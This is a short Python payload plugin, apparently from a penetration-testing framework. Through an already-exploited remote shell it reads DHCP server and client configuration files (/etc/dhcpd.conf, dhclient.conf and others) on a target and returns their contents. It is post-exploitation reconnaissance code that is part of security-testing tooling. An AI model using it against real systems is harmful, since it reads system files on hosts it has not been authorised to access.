import re
from plugins.attack.payloads.base_payload import base_payload

class dhcp_config_files(base_payload):
    '''
    This payload shows DHCP Server configuration files
    '''
    def run_read(self):
        result = []
        files = []

        files.append('/etc/dhcpd.conf')
        files.append('/var/lib/dhcp/dhcpd')
        files.append('/etc/dhcp3/dhclient.conf')
        files.append('/etc/dhclient.conf')
        files.append('/usr/local/etc/dhcpd.conf')

        for file in files:
            if self.shell.read(file) != '':
                result.append('-------------------------')
                result.append('FILE => '+file)
                result.append(self.shell.read(file))

        result = [p for p in result if p != '']
        return result
        
